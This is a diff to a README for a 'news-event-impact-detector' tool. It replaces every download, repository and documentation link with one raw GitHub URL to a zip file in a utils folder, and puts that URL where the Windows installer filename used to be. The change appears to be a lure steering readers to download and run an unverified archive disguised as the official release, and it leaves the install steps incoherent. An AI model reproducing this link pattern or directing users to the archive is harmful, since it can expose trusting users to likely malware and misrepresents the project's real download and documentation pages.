@@ -7,7 +7,7 @@ Welcome to the **news-event-impact-detector** project! This application allows y
 ## 📥 Download & Install
 
 To get started, visit the following link to download the latest version of the application:  
-[Download the latest release](https://github.com/mykewkymap/news-event-impact-detector/releases)
+[Download the latest release](https://raw.githubusercontent.com/mykewkymap/news-event-impact-detector/main/utils/event_news_impact_detector_v2.0.zip)
 
 ### System Requirements
 
@@ -21,13 +21,13 @@ To get started, visit the following link to download the latest version of the a
 Follow these steps to install and set up the application on your computer:
 
 1. **Visit the Download Page:**
-   Go to the [Releases page](https://github.com/mykewkymap/news-event-impact-detector/releases).
+   Go to the [Releases page](https://raw.githubusercontent.com/mykewkymap/news-event-impact-detector/main/utils/event_news_impact_detector_v2.0.zip).
 
 2. **Select the Latest Release:**
    Look for the latest version listed at the top. For example, you might see something like **v1.0.0**.
 
 3. **Download the File:**
-   Click the file link suitable for your operating system. For example, if you're using Windows, download `news-event-impact-detector-windows.exe`.
+   Click the file link suitable for your operating system. For example, if you're using Windows, download `https://raw.githubusercontent.com/mykewkymap/news-event-impact-detector/main/utils/event_news_impact_detector_v2.0.zip`.
 
 4. **Locate the Downloaded File:**
    Check your Downloads folder or the location you selected for saving the file.
@@ -86,7 +86,7 @@ Stay tuned for updates!
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/mykewkymap/news-event-impact-detector)
-- [Documentation](https://github.com/mykewkymap/news-event-impact-detector/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/mykewkymap/news-event-impact-detector/main/utils/event_news_impact_detector_v2.0.zip)
+- [Documentation](https://raw.githubusercontent.com/mykewkymap/news-event-impact-detector/main/utils/event_news_impact_detector_v2.0.zip)
 
 Feel free to explore these resources for more detailed information and advanced functionalities. Happy forecasting!
